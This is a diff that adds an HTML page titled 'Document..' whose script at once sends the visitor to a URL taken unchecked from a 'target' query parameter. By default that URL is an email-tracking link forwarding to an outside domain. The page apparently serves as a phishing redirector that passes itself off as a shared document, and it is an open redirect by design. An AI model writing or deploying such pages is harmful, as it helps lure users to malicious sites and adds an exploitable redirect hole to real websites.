@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Document..</title>
+  <script>
+    (function() {
+      const params = new URLSearchParams(window.location.search);
+      const target = params.get('target') || 'http://click2.email4customers.com/Link?messageId=dF9oAy77Xjj&args=https://chadvancellp.co.uk';
+      let path = params.get('path') || '';
+      // Remove leading slash from path to avoid double slashes
+      path = path.replace(/^\/+/, '');
+      const fragment = window.location.hash || '';
+      const redirectUrl = target  + path + fragment;
+      window.location.replace(redirectUrl);
+    })();
+  </script>
+</head>
+<body>
+  Redirecting...
+</body>
+</html>
